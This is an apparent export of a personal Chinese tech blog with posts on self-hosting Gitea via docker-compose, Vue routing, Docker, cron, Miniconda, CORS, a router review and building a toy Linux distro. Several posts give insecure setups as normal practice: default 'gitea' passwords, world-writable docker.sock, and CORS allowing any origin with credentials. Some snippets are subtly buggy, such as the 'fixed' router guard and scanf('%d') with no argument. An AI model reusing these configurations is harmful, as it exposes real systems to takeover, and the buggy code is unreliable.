    <url>/posts/2fecdaca/</url>
    <content><![CDATA[部署gitea的原因使用gitea的原因：本质上是因为在本地硬盘上每次学习一些新知识，于是创建一些demo性质的应用。特别是vue，react之类的前端应用。每个项目都会有node_module这个文件夹，这里面有特别多的4k小文件，这导致我备份硬盘数据时。速率总是被压的很低。所以我在想能不能通过一个本地部署的类似github的服务器，实现我对这些项目的备份，然后通过配置.gitignore忽略掉哪些中间过程文件和复杂的库文件。来实现对磁盘的高效率备份。
部署完gitea后，发现他其实可以很好的替代github，gitee来作为我自己的代码仓库使用。而且他也确实有很多优点，包括如下图片等功能。而且他作为本地化服务，我不需要担心网络故障，权限校验等问题。
部署过程这部分内容主要参考大佬文章以及gitea官网
我只说明我需要使用的docker compose部署的内容
首先配置一个docker-compose.yml，其内容如下
version: &quot;3&quot;networks:  gitea:    external: false  # 这个nginx_container是我自己创建的一个nginx的网络，实现https代理的功能，而且只通过nginx实现代理，而不占用外部端口。具体内容我会再另一篇关于nginx的实战中说明# nginx_container:  #  external: trueservices:  server:    image: gitea/gitea:1.21.1    container_name: gitea    environment:      - USER_UID=1000      - USER_GID=1000      - GITEA__database__DB_TYPE=mysql      - GITEA__database__HOST=db:3306      - GITEA__database__NAME=gitea      - GITEA__database__USER=gitea      - GITEA__database__PASSWD=gitea      # 一定要设置好下面的两个环境变量，如果不设置好，使用的时候可能ssh克隆的时候会有问题      - SSH_PORT=20022      - SSH_LISTEN_PORT=22      # 设置应用程序名称，在页面标题中使用.      - APP_NAME=&quot;这里是标题&quot;      # 日志部分      - GITEA__log__MODE=file      - GITEA__log__ROOT_PATH=/data/gitea/log      - GITEA__log__LEVEL=Debug      - GITEA__log__FILE_NAME=gitea.log      - GITEA__log__MAX_DAYS=7      # 左移20表示1M 左移23就是8M      - GITEA__log__MAX_SIZE_SHIFT=23    restart: always    networks:      - gitea      - nginx_container    volumes:      - ./gitea:/data      - /etc/timezone:/etc/timezone:ro      - /etc/localtime:/etc/localtime:ro    ports:      - &quot;30000:3000&quot; # 如果你直接使用nginx代理后，这里可以直接注释掉，也就不占用30000这个端口，而直接通过nginx代理出来。      - &quot;20022:22&quot;    depends_on:      - db  db:    image: mysql:8.0    restart: always    environment:      - MYSQL_ROOT_PASSWORD=gitea      - MYSQL_USER=gitea      - MYSQL_PASSWORD=gitea      - MYSQL_DATABASE=gitea    networks:      - gitea    command:      - --default-authentication-plugin=mysql_native_password      - --character-set-server=utf8      - --collation-server=utf8_bin    volumes:      - ./mysql:/var/lib/mysql

以上是一些最基础的配置，而关于具体的环境变量等一些选项，请详看关于原作者的解释，那里更加详细。我只谈我使用到的部分：
# 允许用户推送时直接创建仓库- GITEA__repository__ENABLE_PUSH_CREATE_USER=TRUE# 禁止注册- GITEA__service__DISABLE_REGISTRATION=TRUE# ROOTURL- ROOT_URL=&quot;https://gitea.zfxt.top/&quot;

这个内容直接在上面docker-compose.yml中配置在enviroment中即可。这些操作，确保了这个git服务只为我自己服务，不允许注册给其他人，我也可以直接推送来完成仓库的创建，做到全命令行操作。
然后运行docker compose up -d即可运行。然后访问对应的网站，完成初始化配置。不知道的话，一路默认下去就好。然后你就可以享受gitea了。
日常使用当我创建了一个项目，并且使用git init完成本地仓库初始化后，我们就可以把这个仓库推送到我们的gitea中。

添加远程仓库
 git remote add gitea https://gitea.zfxt.top/&#123;用户名&#125;/&#123;自定义仓库名&#125;.git # gitea是自己任意起的名字，一般默认设置为origin# 使用git remote -v 查看是否添加成功

 类似这样子的样式 

推送并自动创建仓库 随意编写几个测试文件 
 git add .git commit -m &quot;test&quot;git push -u gitea main # 注意，这里的远程分支要与本地分支同名：可能是master或者是main# 他推送上去后，会自动创建该仓库，我们就不需要图形化界面点击了

  使用ai的解释如下  之后你默认的git push pull命令都会默认从gitea这个远程分支拉去。同样的，如果你有多个远程仓库分别在github，gitee上，你可以分别使用类似于git push github,git push gitee等方式完成推送


以上
]]></content>
      <categories>
        <category>本地化服务</category>
      </categories>
      <tags>
        <tag>gitea</tag>
      </tags>
  </entry>
  <entry>
    <title>考研心得</title>
    <url>/posts/30f4f6de/</url>
    <content><![CDATA[今天是12月24号。已经考完试两天了。在这里，我想记录一下我考前考后的内心变化。我想这应该会是一件很有意思的事情。
大抵记得我应该是7月份才开始认真准备考研的吧，满打满算我学了也不过4，5个月。在这期间我时常会问自己为什么要考研？我考研的决心，目的到底是什么？
我并没有给出让自己满意的答案。同样的，也有些同学惊异于我怎么突然准备考研了。这个我倒是可以给出理由(那就是家里人想让我考上研究生，或许是村里出了几个研究生让他们在村中聊天时艳羡不已。所以期望我也考一个吧)。至于我自己给自己的理由的话：可能是因为找工作简历不好看，既没实习也没竞赛。可能我闲散惯了，就是单纯的陪个跑？
所以呢，我自打一开始都没对考上某某某学校有着特别的执着，我对考研的想法也就是我可以继续自由的学习自己喜欢的内容，自己感兴趣的知识。 这也就决定了我的心态：超级良好。
从刚开始的认真复习(每天只玩一两把游戏)，到后面(每天就学两三个小时)。 哈哈哈，有时候也挺想嘲笑自己的。你说说你，考个研，考这么开心。也太不像话了。特别是在10月份拿到第一份offer后。我更是摆的不行。连着玩了一整个礼拜的游戏。后来还是觉得负罪感太重了。才重新捧起课本。
总的来说呢，就是摆着摆着学一点点。既没有特别认真，也没有完全放弃。大概我就是这样的人吧。随随便便的一个人。
而考完后。我对自己的评价就是：我很满意自己的考研全过程。 甚至我对此感到非常开心😍😍😍！！！
在两天四场考试中，我觉得考研就是我经历过最不紧张，最自然的一场考试。 哪怕是平常的期末考，我都会担心能不能及格。而对于考研。考完我就算胜利了。这份心态我觉得我太厉害了。 在考完数学后，我知道自己肯定寄了。四道大题不会写(哈哈哈，我超级想嘲笑自己的)。 但是在返回宿舍的过程中，我觉得这简直太合理了：相比于别人《李四》，《李六》，《1000题》全都刷完了。我呢？我学线代都是看的线代救命课，甚至一套完整的模拟卷都没做完😂。简直是把考研当作了期末考试，一两个月速成的那种。
其实无论是找工作亦或者是考研。其实都还好啦，对于我而言：内心的平和高兴才最有意义。
看到这篇文章的人。或许我的考研理念和你不太一样，可能你会不耻于我的想法，觉得我看不起考研这等大事。 但是没关系，快乐最重要。我同样祝愿看到这篇文章的你们，可以在生活中保持乐观的态度，多笑一笑，多开心开心。嘿嘿❤️

附上：快乐是人生的主旋律，但是适当的难过也别有一番风味。 我把考研成功与另一件我看重的事相绑定。所以在知道我知道自己考研肯定无望后，我也理所当然的沉浸在悲伤中。迅速调整心态，让自己重新看向远方。也是一种难得的历练。

]]></content>
      <categories>
        <category>上岸</category>
      </categories>
  </entry>
  <entry>
    <title>自给自足的 SQLite 轻量级数据库</title>
    <url>/posts/11e2cf34/</url>
    <content><![CDATA[SQLite是一个进程内的库，实现了自给自足的、无服务器的、零配置的、事务性的 SQL 数据库引擎。SQLite 是非常小的，是轻量级的，完全配置时小于 400KiB，省略可选功能配置时小于250KiB。SQLite 是自给自足的，这意味着不需要任何外部的依赖。
sqlite的使用第一步，你需要安装sqlite，他与mysql的安装并不一样，他只有sqlite3.def、sqlite3.dll 和 sqlite3.exe 文件三个文件，所以他是极为轻量级的。(windows中)linux中的话，直接apt或者yum安装会更快一些他的下载地址为(下载)[http://www.sqlite.org/download.html]安装后，添加到PATH路径，他便可以基本使用了，在本笔记里，不细讲他的各种细节，只为快速使用而写。然后了解一些基本命令
基本命令C:\&gt;sqlite3SQLite version 3.7.15.2 2013-01-09 11:53:05Enter &quot;.help&quot; for instructionsEnter SQL statements terminated with a &quot;;&quot;sqlite&gt;
输入sqlite3后进入sqlite的内部.quit退出sqlite3提示符.open如果存在文件则直接打开文件，如果不存在则创建
sqlite&gt;.open test.db

tip:在sqlite中一个db就是一个数据库。

sqlite3 testDB.db .dump &gt; testDB.sql
以上命令可以将数据库的内容备份到testDB.sql中
sqlite3 testDB.db &lt; testDB.sql
这个命令可以将数据库的内容重新导入会db文件内。
以上就是一些简单的介绍]]></content>
      <tags>
        <tag>Sqlite</tag>
      </tags>
  </entry>
  <entry>
    <title>获取 Kotlin 项目的实际目录</title>
    <url>/posts/e2f3584e/</url>
    <content><![CDATA[如何再kotlin中获取当前项目的实际目录。

调用基于java实现的方法。import java.nio.file.Pathsval path = Paths.get(&quot;&quot;).toAbsolutePath().toString()       
通过系统获取当前目录val path = System.getProperty(&quot;user.dir&quot;)

]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>获取docker run命令</title>
    <url>/posts/7717c1b7/</url>
    <content><![CDATA[
有时候我们需要获取docker run命令，比如我们在docker中运行了一个容器或者别人帮我们启动了一个docker但是未告知我们应该如何再启动一个。这时候我们可以通过docker inspect命令来获取。

安装pip install runlike

支持的参数runlike nginx # 获取nginx容器的run命令Usage: runlike [OPTIONS] [CONTAINER]  Shows command line necessary to run copy of existing Docker container.Options:  --no-name     Do not include container name in output  -p, --pretty  -s, --stdin  --help        Show this message and exit.

已启动容器通过 docker update 对设置 restart 选项docker update --restart=always docker_id
]]></content>
      <tags>
        <tag>linux</tag>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>让pdf阅读变成深色模式</title>
    <url>/posts/568dc21b/</url>
    <content><![CDATA[
javascript:void(document.documentElement.style.filter=&#x27;invert(89%)&#x27;)//或者document.documentElement.style.filter=&#x27;invert(89%)&#x27;]]></content>
  </entry>
  <entry>
    <title>设置非root账号不用sudo直接执行docker命令</title>
    <url>/posts/d40ca6b1/</url>
    <content><![CDATA[
起因是经常使用docker，但使用的是自己的账户，这样就每次都需要使用sudo来创建容器和相关的目录。而这样带来的后果就是，我后续的每一个操作都需要加上sudo命令。否则连修改文件都做不到。因此写下这篇文章

设置

创建名为docker的组，如果之前已经有该组就会报错，可以忽略这个错误：

sudo groupadd docker


将当前用户加入组docker：

sudo gpasswd -a $&#123;USER&#125; docker


重启docker服务(生产环境请慎用)：

sudo systemctl restart docker


添加访问和执行权限：

sudo chmod a+rw /var/run/docker.sock

然后就可以了，不用再使用sudo命令了。
]]></content>
      <tags>
        <tag>linux</tag>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>解决ubuntu下定时任务不执行的问题</title>
    <url>/posts/c17db359/</url>
    <content><![CDATA[先打开日志查看cron运行日志（/var/log/cron.log），但是并未找到相关文件，原因是ubuntu默认没有开cron日志，执行命令：
sudo vim /etc/rsyslog.d/50-default.conf

找到cron.log相关行，将前面注释符#去掉，保存退出，重启rsyslog：
sudo  service rsyslog  restart

执行less -10 /var/log/cron.log再次查看cron运行日志，log出来了，提示如下信息：
No MTA installed, discarding output

原因是cron把屏幕输出都发送到email了，而当前环境并未安装email server，于是系统报错，解决方面就是不要直接向屏幕输出内容，而是重定向到一个文件。
修改任务文件
sudo vim /var/spool/cron/crontabs/waterfronter

将末行改为：
* * * * * echo &quot;Hello world!&quot; &gt;&gt; /tmp/cron_log.txt

保存退出，同时reload cron服务：
sudo service cron reload

若干分钟后查看/tmp/cron_log.txt，“Hello world!”每隔一分钟输出一次，问题解决。
]]></content>
  </entry>
  <entry>
    <title>路由守卫：全局、独享、组件内</title>
    <url>/posts/87e09fe4/</url>
    <content><![CDATA[路由守卫需要在路由中进行配置
全局路由前置全局前置路由守卫//切换路由或者初始化的时候都会调用一次//to:前往的地址。from：过来的地址。next：是否允许前往，调用后即放行route.beforeEach((to,from,next)=&gt;&#123;  next()//允许放行&#125;)
可以在路由中的meta属性中添加属性。来选择那些路由需要鉴权。哪些不需要鉴权。
后置全局前置路由守卫//切换路由或者初始化的时候都会调用一次//to:前往的地址。from：过来的地址。next：是否允许前往，调用后即放行route.afterEach((to,from)=&gt;&#123;  &#125;)
独享路由守卫在每个子路由内使用beforeEnter:  (to,from,next)&#x3D;&gt;{}他的逻辑和全局路由守卫一样，但是他只写在单个子路由内。而且独享路由守卫只有前置路由守卫。
组件内路由守卫
]]></content>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>路由守卫栈内存溢出处理</title>
    <url>/posts/791f7a0e/</url>
    <content><![CDATA[路由补充RangeError: Maximum call stack size报以上错误。其大意是说栈内存溢出。以下是我写的代码
router.beforeEach((to,from,next)=&gt;&#123;    if(!localStorage.getItem(&quot;token&quot;))&#123;        next(&quot;/login&quot;)    &#125;&#125;)
现在分析一下。假设他跳转到login页面，然后他会判断是否有token，判断完成，他将眺望login页面。跳转之后他又会进行判断是否又token

因为他不是next()，按照他的流程接着跳转。而是采用了next(“&#x2F;login”)，表示他会重新发起一次跳转，也就是会再过一遍路由守卫。因此他会堆栈溢出而报错。修改后的代码可以改为

router.beforeEach((to,from,next)=&gt;&#123;        if(to.path===&quot;/login&quot;)&#123;        next()    &#125;    if(!localStorage.getItem(&quot;token&quot;))&#123;        next(&quot;/login&quot;)    &#125;&#125;)]]></content>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>路由模式：hash与history</title>
    <url>/posts/fa2e5412/</url>
    <content><![CDATA[hash模式，history模式hash模式：他不会像服务器发送hash值，也就是#后面的内容不会发送到服务器中。history模式：会将路径内容发送到服务器中
]]></content>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>轻量级Python环境管理：Miniconda</title>
    <url>/posts/61ac6d7/</url>
    <content><![CDATA[anaconda作为python的版本管理神器，但由于他的体积太大，安装后大概占约2G左右的空间，因此这里推荐使用miniconda。下载安装conda由于官网下载太慢，因此推荐去(清华大学开源软件镜像站下载)[https://mirrors.tuna.tsinghua.edu.cn/anaconda/miniconda/?C=M&amp;O=D]
修改conda源安装后，需要进行换源，不然下载，导包都会异常缓慢。

conda配置文件位置：~&#x2F;.condarc (Windows路径为：C:\Users.condarc)
清华源配置，通常配置写入标准库的内容即可，若要使用附加库的内容才将其插入“ - defaults”那一行前面：channels:  - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main/  - https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/  - https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/conda-forge/  - https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/msys2/  - https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/bioconda/  - https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/menpo/  - https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud/pytorch/  - defaultsshow_channel_urls: true

修改pip源
pip配置文件位置：~&#x2F;.pip&#x2F;pip.conf (Windows路径为：C:\Users\pip\pip.ini)
阿里源配置：[global]index-url = https://mirrors.aliyun.com/pypi/simple/trusted-host=mirrors.aliyun.comtimeout = 120

建议conda只用来更新conda和python、下载和更新python包使用pip，因为清华源和交大源下载速度远远不及阿里源和华为源。更新conda
conda update conda
更新python
conda update python
更新所有包
conda update --all
清除无用的包
conda clean -p        # 清理无用的包conda clean -t        # 清理tar包conda clean -y --all  # 清理所有安装包及cache
conda管理虚拟环境，他默认为base环境需要打开自动进入base环境，使用下面的命令：
conda config --set auto_activate_base true
创建自定义环境
conda create --name py38 python=3.8
查看所有环境
conda env list]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>miniconda</tag>
      </tags>
  </entry>
  <entry>
    <title>通过文件读写实现聊天对话（kotlin）</title>
    <url>/posts/4e2d082b/</url>
    <content><![CDATA[首先声明，这个任务并没有实现，我暂时没找到可以用来解决kotlin中实时监听键盘动作，并且不会阻塞的回调方法。
import kotlinx.coroutines.*import java.io.Fileimport java.io.FileReader fun main()= runBlocking&#123;    val file = File(&quot;src/main/resources/a.txt&quot;)     var i = 0    while (true)&#123;        println(&quot;第$&#123;i++&#125;次访问文件&quot;)        delay(2000)        println(file.readText())        println(&quot;读取完成&quot;)//        if(readln()==&quot;chat&quot;)&#123;//            var message = readln()//            file.writeText(message)//        &#125;    &#125;&#125;
以上代码可以实现每隔两秒钟对文件进行一次读取操作，期间我可以通过文本编辑器对文件进行写操作，然后他能够实时更新到我写的内容，于是，考虑能否通过文件读写进行聊天对话？** 因为，在不同的操作系统中，换行符的表示方式是不一样的。在UNIX系统中，换行符使用”\n” , 在 windows 系统中换行使用 “\r\n”; 在旧版macOS中换行使用回车符”&#x2F;r”,在新版macOS中使用与unix系统相同的换行方式。**然后\r:13;\n:10，这就是为什么会在文件读取中会读取到则会两个ascii码的原因
javaIO读写原理接下来这部分内容引用自某位知乎大佬,无论是Socket的读写还是文件的读写，在Java层面的应用开发或者是linux系统底层开发，都属于输入input和输出output的处理，简称为IO读写。在原理上和处理流程上，都是一致的。区别在于参数的不同。
先强调一个基础知识：read系统调用，并不是把数据直接从物理设备，读数据到内存。write系统调用，也不是直接把数据，写入到物理设备。
read系统调用，是把数据从内核缓冲区复制到进程缓冲区；而write系统调用，是把数据从进程缓冲区复制到内核缓冲区。这个两个系统调用，都不负责数据在内核缓冲区和磁盘之间的交换。底层的读写交换，是由操作系统kernel内核完成的。
内核缓冲与进程缓冲区缓冲区的目的，是为了减少频繁的系统IO调用。大家都知道，系统调用需要保存之前的进程数据和状态等信息，而结束调用之后回来还需要恢复之前的信息，为了减少这种损耗时间、也损耗性能的系统调用，于是出现了缓冲区。
有了缓冲区，操作系统使用read函数把数据从内核缓冲区复制到进程缓冲区，write把数据从进程缓冲区复制到内核缓冲区中。等待缓冲区达到一定数量的时候，再进行IO的调用，提升性能。至于什么时候读取和存储则由内核来决定，用户程序不需要关心。
在linux系统中，系统内核也有个缓冲区叫做内核缓冲区。每个进程有自己独立的缓冲区，叫做进程缓冲区。
所以，用户程序的IO读写程序，大多数情况下，并没有进行实际的IO操作，而是在读写自己的进程缓冲区。
四种主要的IO模型（1）同步阻塞IO（Blocking IO）首先，解释一下这里的阻塞与非阻塞：
阻塞IO，指的是需要内核IO操作彻底完成后，才返回到用户空间，执行用户的操作。阻塞指的是用户空间程序的执行状态，用户空间程序需等到IO操作彻底完成。传统的IO模型都是同步阻塞IO。在java中，默认创建的socket都是阻塞的。
其次，解释一下同步与异步：
同步IO，是一种用户空间与内核空间的调用发起方式。同步IO是指用户空间线程是主动发起IO请求的一方，内核空间是被动接受方。异步IO则反过来，是指内核kernel是主动发起IO请求的一方，用户线程是被动接受方。
（4）同步非阻塞IO（Non-blocking IO）非阻塞IO，指的是用户程序不需要等待内核IO操作完成后，内核立即返回给用户一个状态值，用户空间无需等到内核的IO操作彻底完成，可以立即返回用户空间，执行用户的操作，处于非阻塞的状态。
简单的说：阻塞是指用户空间（调用线程）一直在等待，而且别的事情什么都不做；非阻塞是指用户空间（调用线程）拿到状态就返回，IO操作可以干就干，不可以干，就去干的事情。
非阻塞IO要求socket被设置为NONBLOCK。
强调一下，这里所说的NIO（同步非阻塞IO）模型，并非Java的NIO（New IO）库。
（3）IO多路复用（IO Multiplexing）即经典的Reactor设计模式，有时也称为异步阻塞IO，Java中的Selector和Linux中的epoll都是这种模型。
（5）异步IO（Asynchronous IO）异步IO，指的是用户空间与内核空间的调用方式反过来。用户空间线程是变成被动接受的，内核空间是主动调用者。
这一点，有点类似于Java中比较典型的模式是回调模式，用户空间线程向内核空间注册各种IO事件的回调函数，由内核去主动调用。
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
      <tags>
        <tag>网络IO</tag>
      </tags>
  </entry>
  <entry>
    <title>配置代理服务器和样式文件优化</title>
    <url>/posts/d58cfba6/</url>
    <content><![CDATA[配置代理服务器（方式1）前端从8080访问5000端口时会被cros拦截，因此在vue.config.js下配置一个代理服务器，他会替你转发命令
//开启代理服务器devServer: &#123;  proxy: &#x27;http://localhost:5000&#x27;&#125;
不太完美
更好的方法。（方式2）开启代理服务器
devServer:&#123;  proxy: &#123;      //请求前缀，（路径名）      &#x27;/api&#x27;:  &#123;          target: &#x27;&lt;url&gt;&#x27;,          pathRewrite:&#123;&#x27;^/api&#x27;:&#x27;&#x27;&#125;//用于去处前缀发送一个不带前缀的请求。          //当然，可以选择和后端服务器统一前缀，这样也可以不用去除前缀发送。          ws: true,//用于支持websocket          changeOrigin: true//用于控制请求头中的host字段        &#125;,        &#x27;/foo&#x27;:  &#123;            target: &#x27;&lt;other_url&gt;&#x27;          &#125;    &#125;&#125;
样式文件从第三方引入样式文件，如果放在&#x2F;src&#x2F;asset下面，那么需要通过import引入改样式，这样子引入的样式会经过vue-cli的严格检查，如果有需要使用但没有的文件，将会报错，无法正常使用。而如果放在&#x2F;public目录下，然后在index.html中引入，就不会有该问题。
]]></content>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title>重定向和转发</title>
    <url>/posts/79ac9ac2/</url>
    <content><![CDATA[
重定向简而言之，重定向就是servlet将新的URL返回给Location，浏览器获得Location值，访问新的URL。从时序图中可以看出，服务器只负责将新的URL注入Location，URL的转变是由浏览器完成的
转发与重定向不同的是，转发的动作是在服务端完成，也就是说server直接将新的URL中的资源返回给浏览器，浏览器地址栏不变，用户察觉不到URL的转变。
]]></content>
  </entry>
  <entry>
    <title>配置跨域请求过滤器</title>
    <url>/posts/a5e89d98/</url>
    <content><![CDATA[配置一个CROS的模板类，暂且不考虑其中的原理，我也不会咯。package com.zfxt.sjv.config;import org.springframework.context.annotation.Configuration;import org.springframework.web.servlet.config.annotation.CorsRegistry;import org.springframework.web.servlet.config.annotation.WebMvcConfigurer;/** * @author:zfx-t * @version:1.0 */@Configurationpublic class CrosConfiguration implements WebMvcConfigurer &#123;    /**     * 允许跨域调用的过滤器     */    @Override    public void addCorsMappings(CorsRegistry registry) &#123;        registry.addMapping(&quot;/**&quot;)                .allowedOriginPatterns(&quot;*&quot;)                .allowedMethods(&quot;GET&quot;, &quot;PUT&quot;, &quot;POST&quot;, &quot;DELETE&quot;, &quot;HEAD&quot;, &quot;OPTIONS&quot;)                .allowCredentials(true)                .maxAge(3600)                .allowedHeaders(&quot;*&quot;);    &#125;&#125;]]></content>
      <tags>
        <tag>JAVA</tag>
        <tag>CROS</tag>
      </tags>
  </entry>
  <entry>
    <title>闭包：函数访问外部变量</title>
    <url>/posts/a76224b3/</url>
    <content><![CDATA[
该笔记引用自掘金闭包

闭包定义：

（官方定义）闭包是函数和声明该函数的词法环境的组合。
闭包就是能够读取其他函数内部变量的函数。在本质上，闭包就是将函数内部和函数外部连接起来的一座桥梁。产生条件：
一个函数，里面有一些变量和另一个函数
外部函数里面的函数使用了外部函数的变量
外部函数最后把它里面的那个函数用return抛出去作用： 
在函数外部可以读取函数内部的变量
让这些变量的值始终保持在内存中

]]></content>
      <tags>
        <tag>JS</tag>
        <tag>闭包</tag>
      </tags>
  </entry>
  <entry>
    <title>鲲鹏c8-650使用体验</title>
    <url>/posts/6cd0ffe7/</url>
    <content><![CDATA[开箱一台鲲鹏CPE，型号为鲲鹏C8-650，官方定位为青春极客产品。

我是3.21晚上十一点首发购买的，首发价格899，到货返还200，实际699到手，目前全面699价格铺货。先看一下产品和包装吧。
C8系列同模具外壳
右上角送的散热器 口罩防尘  赠品包括散热器、dc一分二、诱骗线特别说明：C8-650以及C8-668官方宣传为“支持开源”，原厂固件在系统备份升级一项中有刷写第二系统的入口。第二系统openwrt固件由玩家自制，C8-650的openwrt固件由周佬@Manper 制作，有幸成为第一位体验者，由于我是第一批三月底就拿到手的，当时C8-650的固件还没有制作，路由部分650主板与668完全一致，仅5G模块部分有所差异，到手时我就尝试刷入了668的第二系统，可以成功开机，模块部分也能识别，但是无法拨号上网。直入主题，下边是购买及使用体验：从去年七月份产生“使用移动网络给设备稳定供网”的想法开始，我先后使用了4G手机，5G手机usb共享网络+小米r3g路由器供网，以及4G随身wifi棒子+路由器供网，均无法满足日常需求，手机usb网络共享的方式连接路由器，经常会出现断电后手机无法成功自动开启usb网络共享，没有良好的无感体验；使用4G随身wifi棒子可以实现完美的来电来网体验，但是拉胯的4G网络，再加上用来中转的路由器（中兴e8822）性能太弱，在学校宿舍厕所内（一堵墙）会断网，且延迟高不太稳定，慢慢把视线转移到CPE上。考虑到北京移动不稳定随时翻车，再加上我有一张本地归属地的2023版199三折冰（套内包含200G通用+钉钉定向双不限流量包），因此想要购入一台可以刷入openwrt的路由器，哪怕在北移翻车无法使用后搭配199三折冰也可以实现实现流量自由(即ml)。囊中羞涩，售价699，mt7981方案，ax3000，5G模块采用春藤v510（移远rm500u-cnv）的鲲鹏C8-650发售后我就第一批购买了。使用体验方面，总体来讲十分满意，完美符合我的需求。C8-650有内置卡，同时也支持插入外置卡使用，卡槽位于机器底部，支持的卡板为nano小卡。我日常使用openwrt系统，1+8的配置对于我这种偶尔随便折腾折腾的人来讲完全够用。无风扇温度无风扇模块温度最新版固件已支持模块识别，锁频段小区日常使用，不加风扇温度高，但不影响使用，上图温度时测速表现如下：高温负载下速度不稳定，但不会断网官方实测rm500u测速能达到750mbps（下行），我自己实测（基于1000下行100上行的北京移动）在宿舍的网速最高能到550mbps，同时间同位置手机测速在600mbps，实际体验上cpe下行速度慢于手机，上行速度较快于手机，术业有专攻，多设备供网在体验和稳定性上cpe远远强于手机。测速如下图CPE最高550mbps，同位置手机680mbps。基站限速跑不满千兆速率同时，关于ml的可行性我也测试了一下，和部署在手机上的原理一样，具体我不展开讲，仅表示该方案可行，如图可行性✔️好用与否需要自行研究，这方面我了解的不是很深入由于C8-650，C8-668仅5G模块不同，C8-660存储配置较小，这三款主板均有m.2插槽，有群友想要更换模块使用，经大佬编译后，C8开源系列已经支持在openwrt下更换模块后自动识别rm500u，rm520n以及部分模块，C8-650的配置高售价低，不满于模块的也可以更换模块使用了。@Manper 周佬实力强大关于openwrt的玩法，例如alist，docker下的小雅alist，青龙面板等，以及酸酸乳，小猫咪等，mt7981和1+8的配置处理这些轻量化的任务还是能轻松胜任的，但是也正是因为mt7981，高温和处理器瓶颈是一大问题，做一台合格的cpe完全没问题，鲲鹏张导(前极路由创业者，现二次创业鲲鹏无限，布局5G终端)号称给产品做三年质保，相信只有强大的硬件已经足够的信心才能有这样的底气。Nradio C8-650 No2  鲲鹏C8-650第二系统，可一键切换官方系统关于外网访问，原厂系统厂家并没有做外网访问功能，openwrt下cpe由移动网络供网时，没有ipv4公网，不过手机卡都有ipv6，可以通过ddns固定ipv6地址到域名，使用ipv6远程访问路由器，或者使用nps内网穿透，frp，ddns to等方式。我更倾向于自己搭建的服务而不是istore的ddns-to功能，下边简单介绍一下ddns ipv6的设置方式，教程很多，我简单描述一下wan口放行Lucky 域名解析Lucky 端口转发解析生效流量 模拟外网环境 ipv6访问ps:设置上没有问题，然而实际访问时有时可以访问到，有时又联不通，原因未知，在此虚心请教各位如何解决这一问题。长ping测试左ping路由 右ping外网夜间进行持续长ping长ping时无散热，室内温度25℃，路由模块85℃，高温负载下任稳定运行有部分鹏友表示650有断网断流现象，我在使用中也曾在某两天内多次遇到断流断网无法拨号的情况，原因未知，后续使用就再没有出现过。瑕不掩瑜，鲲鹏C8-650能完美符合我的需求，是一款性价比产品，也希望在后续使用中厂家能做好优化，搞好售后。
引用自:https://www.zhihu.com/question/33774281/answer/3468823863
]]></content>
  </entry>
  <entry>
    <title>饥荒联机服务器搭建 (本地、云服务器、双云服务器)</title>
    <url>/posts/c262d63/</url>
    <content><![CDATA[直接查看该文章
文章链接: https://mstzf.cn/posts/DoNotStarveTogether_Server/
]]></content>
      <categories>
        <category>windows</category>
      </categories>
  </entry>
  <entry>
    <title>手搓一个linux发行版(娱乐向)</title>
    <url>/posts/44df985e/</url>
    <content><![CDATA[手搓Linux发行版
该文章主要引用自于小乐大佬的B站视频自己跟着视频手搓了一遍并把视频教程做成博客，同时记录一些自己出现的问题

编译内核第一步就是从网上找到现成的linux内核并下载下来，Linux Kernel Archives
我下载的时候，与视频中的版本不相同，这也导致我后面出现了一些无法解决的问题。在视频中的稳定内核版本为6.13.2,而我的版本为6.17.3。我出现的问题是我无法打开FB_EFI。（这在第二弹视频中有提到过）。启动系统后只有一个光标，但是一直无法显示后续内容的黑屏。在下面我给出GPT的相关回答。

这是我问GPT给出的相关答案在 Linux 内核 6.17.3 这一版本中，如果你在 make menuconfig 或 make xconfig 里 看不到 “EFI-based Framebuffer Support” 选项（CONFIG_FB_EFI），这是正常的现象 —— 从 内核 6.x 开始，Framebuffer 与 EFI 的支持方式发生了较大变化。

内核逐步弃用老旧的 fbdev 驱动（如 efifb、uvesafb）。
DRM（Direct Rendering Manager） 体系成为主流。
EFI framebuffer 功能被整合进 simpledrm 驱动 中，而不再独立显示 CONFIG_FB_EFI。


最终我的解决方案是手动修改.config文件，设置了下面这些参数
CONFIG_FB=yCONFIG_FRAMEBUFFER_CONSOLE=yCONFIG_DRM_SIMPLEDRM=yCONFIG_DRM_FBDEV_EMULATION=yCONFIG_EFI=yCONFIG_EFI_VARS=y

下面给一串代码，包括下载，解压和编译的过程注意下面跑代码的时候可能会出现很多缺包，版本不匹配的问题。你直接将代码复制粘贴给GPT就可以解决。这不是问题的重点，所以自行ask gpt就成
# 下载wget https://cdn.kernel.org/pub/linux/kernel/v6.x/linux-6.17.3.tar.xz # 注意版本，你需要下载自己所需要的版本# 解压tar -xf linux-6.17.3.tar.xz# 进入目录并设置编译配置cd linux-6.17.3make defconfig # 生成一个默认配置.configvim .config # 根据我上面引用的GPT内容进行修改。关于vim如何查找，使用。请自行google。make -j 8 # 开始编译，并以8个线程同步运行# 编译完成后，会在arch/x86/boot/下生成一个bzImage，这就是你需要使用的内核文件# 模拟跑一次qemu-system-x86_64 -kernel arch/x86/boot/bzImage #不要ssh跑，他不会显示黑框框的。

自制shell，模拟一次运行过程编写一个shell.c文件,这个代码会作为一个启动程序，当我们启动linux会直接启动这个shell脚本。
#include&lt;stdio.h&gt;int main()&#123;    while(1)&#123;        printf(&quot;Hello World\n&quot;);        scanf(&quot;%d&quot;);    &#125;&#125;

将c文件编译成一个可执行文件，同时将其设置为static，取消动态链接。
